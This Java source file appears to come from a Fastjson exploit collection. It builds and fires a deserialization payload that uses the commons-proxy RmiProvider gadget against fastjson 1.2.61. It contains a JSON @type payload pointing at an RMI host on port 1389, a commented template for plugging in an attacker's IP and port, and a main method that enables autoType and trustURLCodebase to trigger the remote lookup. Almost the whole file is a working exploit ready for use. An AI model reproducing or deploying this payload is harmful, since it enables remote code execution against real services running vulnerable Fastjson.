package fastjsonExp;

import utils.FastjsonVersionCtr;
import utils.StringUtils;

/**
 * 已完成
 * org.apache.commons.proxy
 * still work at fastjson 1.2.61
 */

public class EXP4commons_proxy {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.RmiProvider\",\"host\":\"127.0.0.1\",\"port\":1389,\"name\":\"run\",\"registry\":null}";
    //public String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.RmiProvider\",\"host\":\"replace_ip_address\",\"port\":replace_port,\"name\":\"replace_name\",\"registry\":null}";

    public EXP4commons_proxy(){}

    public String getPayload(){
        System.out.println(this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.61");
        myFastjson.mySetAutoType(true);
        EXP4commons_proxy exp = new EXP4commons_proxy();
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();

    }


}
